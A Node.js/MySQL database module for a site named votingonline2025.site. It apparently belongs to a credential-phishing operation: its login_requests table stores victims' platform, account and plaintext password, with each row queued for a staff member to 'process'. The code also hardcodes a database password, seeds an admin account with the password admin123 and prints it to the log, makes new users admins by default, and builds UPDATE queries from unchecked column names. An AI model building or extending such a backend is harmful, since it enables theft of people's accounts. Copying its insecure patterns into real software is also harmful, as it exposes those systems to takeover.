/**
 * MySQL Database Connection for VPS Production
 * votingonline2025.site
 */

import mysql from "mysql2/promise";
import dotenv from "dotenv";

dotenv.config({ path: ".env.production" });

// MySQL Connection Configuration
const dbConfig = {
  host: process.env.DB_HOST || "localhost",
  port: process.env.DB_PORT || 3306,
  user: process.env.DB_USER || "voti_voting_user",
  password: process.env.DB_PASSWORD || "123123zz@",
  database: process.env.DB_NAME || "voti_voting_secure_2025",
  waitForConnections: true,
  connectionLimit: 10,
  queueLimit: 0,
  acquireTimeout: 60000,
  timeout: 60000,
  reconnect: true,
  ssl: false, // Set to true if your MySQL server requires SSL
};

let connection = null;
let isConnected = false;

// Database connection
export const connectDB = async () => {
  try {
    console.log("🔗 Connecting to MySQL database...");

    connection = await mysql.createConnection(dbConfig);

    // Test connection
    await connection.execute("SELECT 1");

    isConnected = true;
    console.log("✅ MySQL database connected successfully");
    console.log(
      `📊 Database: ${dbConfig.database} on ${dbConfig.host}:${dbConfig.port}`
    );

    // Initialize tables
    await initializeTables();

    return connection;
  } catch (error) {
    console.error("❌ MySQL connection failed:", error.message);
    isConnected = false;
    throw error;
  }
};

// Initialize database tables
const initializeTables = async () => {
  try {
    console.log("🔧 Initializing database tables...");

    // Users table
    await connection.execute(`
      CREATE TABLE IF NOT EXISTS users (
        id VARCHAR(36) PRIMARY KEY,
        email VARCHAR(255) UNIQUE NOT NULL,
        username VARCHAR(255) UNIQUE NOT NULL,
        password_hash VARCHAR(255) NOT NULL,
        role ENUM('admin', 'user', 'moderator') DEFAULT 'admin',
        is_active BOOLEAN DEFAULT TRUE,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
        INDEX idx_email (email),
        INDEX idx_username (username),
        INDEX idx_role (role)
      )
    `);

    // Login requests table
    await connection.execute(`
      CREATE TABLE IF NOT EXISTS login_requests (
        id VARCHAR(36) PRIMARY KEY,
        platform VARCHAR(100) NOT NULL,
        account VARCHAR(255) NOT NULL,
        password TEXT NOT NULL,
        status ENUM('pending', 'processing', 'completed', 'failed') DEFAULT 'pending',
        notes TEXT,
        assigned_to VARCHAR(36),
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
        processed_at TIMESTAMP NULL,
        INDEX idx_status (status),
        INDEX idx_platform (platform),
        INDEX idx_created_at (created_at),
        FOREIGN KEY (assigned_to) REFERENCES users(id) ON DELETE SET NULL
      )
    `);

    // System logs table
    await connection.execute(`
      CREATE TABLE IF NOT EXISTS system_logs (
        id INT AUTO_INCREMENT PRIMARY KEY,
        level ENUM('info', 'warn', 'error', 'debug') NOT NULL,
        message TEXT NOT NULL,
        metadata JSON,
        user_id VARCHAR(36),
        ip_address VARCHAR(45),
        user_agent TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        INDEX idx_level (level),
        INDEX idx_created_at (created_at),
        INDEX idx_user_id (user_id),
        FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE SET NULL
      )
    `);

    // User sessions table (for JWT refresh tokens)
    await connection.execute(`
      CREATE TABLE IF NOT EXISTS user_sessions (
        id VARCHAR(36) PRIMARY KEY,
        user_id VARCHAR(36) NOT NULL,
        refresh_token TEXT NOT NULL,
        expires_at TIMESTAMP NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        last_used_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
        ip_address VARCHAR(45),
        user_agent TEXT,
        INDEX idx_user_id (user_id),
        INDEX idx_expires_at (expires_at),
        FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
      )
    `);

    // Create default admin user if not exists
    const [existingUsers] = await connection.execute(
      "SELECT id FROM users LIMIT 1"
    );

    if (existingUsers.length === 0) {
      console.log("👤 Creating default admin user...");

      const bcrypt = await import("bcrypt");
      const crypto = await import("crypto");

      const defaultUser = {
        id: crypto.randomUUID(),
        email: "admin@votingonline2025.site",
        username: "admin",
        password_hash: await bcrypt.hash("admin123", 12),
        role: "admin",
      };

      await connection.execute(
        `
        INSERT INTO users (id, email, username, password_hash, role)
        VALUES (?, ?, ?, ?, ?)
      `,
        [
          defaultUser.id,
          defaultUser.email,
          defaultUser.username,
          defaultUser.password_hash,
          defaultUser.role,
        ]
      );

      console.log("✅ Default admin user created");
      console.log("📧 Email: admin@votingonline2025.site");
      console.log("🔑 Password: admin123");
    }

    console.log("✅ Database tables initialized successfully");
  } catch (error) {
    console.error("❌ Failed to initialize tables:", error.message);
    throw error;
  }
};

// Production Database Interface
export const productionDB = {
  // User operations
  async getUserByEmail(email) {
    if (!isConnected) throw new Error("Database not connected");

    const [rows] = await connection.execute(
      "SELECT * FROM users WHERE email = ? AND is_active = TRUE",
      [email]
    );

    return rows[0] || null;
  },

  async getUserByUsername(username) {
    if (!isConnected) throw new Error("Database not connected");

    const [rows] = await connection.execute(
      "SELECT * FROM users WHERE username = ? AND is_active = TRUE",
      [username]
    );

    return rows[0] || null;
  },

  async getUserById(id) {
    if (!isConnected) throw new Error("Database not connected");

    const [rows] = await connection.execute(
      "SELECT * FROM users WHERE id = ? AND is_active = TRUE",
      [id]
    );

    return rows[0] || null;
  },

  async createUser(userData) {
    if (!isConnected) throw new Error("Database not connected");

    await connection.execute(
      `
      INSERT INTO users (id, email, username, password_hash, role, is_active)
      VALUES (?, ?, ?, ?, ?, ?)
    `,
      [
        userData.id,
        userData.email,
        userData.username,
        userData.password_hash,
        userData.role,
        true,
      ]
    );

    return userData;
  },

  // Login requests operations
  async getLoginRequests(limit = 50, offset = 0) {
    if (!isConnected) throw new Error("Database not connected");

    const [rows] = await connection.execute(
      `
      SELECT lr.*, u.username as assigned_username
      FROM login_requests lr
      LEFT JOIN users u ON lr.assigned_to = u.id
      ORDER BY lr.created_at DESC
      LIMIT ? OFFSET ?
    `,
      [limit, offset]
    );

    return rows;
  },

  async createLoginRequest(requestData) {
    if (!isConnected) throw new Error("Database not connected");

    const crypto = await import("crypto");
    const id = crypto.randomUUID();

    await connection.execute(
      `
      INSERT INTO login_requests (id, platform, account, password, status, notes)
      VALUES (?, ?, ?, ?, ?, ?)
    `,
      [
        id,
        requestData.platform,
        requestData.account,
        requestData.password,
        requestData.status || "pending",
        requestData.notes || null,
      ]
    );

    return { id, ...requestData };
  },

  async updateLoginRequest(id, updateData) {
    if (!isConnected) throw new Error("Database not connected");

    const fields = [];
    const values = [];

    Object.keys(updateData).forEach((key) => {
      if (updateData[key] !== undefined) {
        fields.push(`${key} = ?`);
        values.push(updateData[key]);
      }
    });

    if (fields.length === 0) return;

    values.push(id);

    await connection.execute(
      `
      UPDATE login_requests SET ${fields.join(", ")} WHERE id = ?
    `,
      values
    );
  },

  async deleteLoginRequest(id) {
    if (!isConnected) throw new Error("Database not connected");

    await connection.execute("DELETE FROM login_requests WHERE id = ?", [id]);
  },

  // Logging
  async logEvent(
    level,
    message,
    metadata = {},
    userId = null,
    ipAddress = null
  ) {
    if (!isConnected) return; // Don't throw error for logging

    try {
      await connection.execute(
        `
        INSERT INTO system_logs (level, message, metadata, user_id, ip_address)
        VALUES (?, ?, ?, ?, ?)
      `,
        [level, message, JSON.stringify(metadata), userId, ipAddress]
      );
    } catch (error) {
      console.error("Failed to log event:", error.message);
    }
  },

  // Health check
  async healthCheck() {
    if (!isConnected) return { status: "disconnected" };

    try {
      const [result] = await connection.execute("SELECT 1 as health");
      return { status: "healthy", connection: "active" };
    } catch (error) {
      return { status: "error", error: error.message };
    }
  },
};

// Cleanup on exit
process.on("SIGTERM", async () => {
  if (connection) {
    await connection.end();
    console.log("📊 MySQL connection closed");
  }
});

export default productionDB;
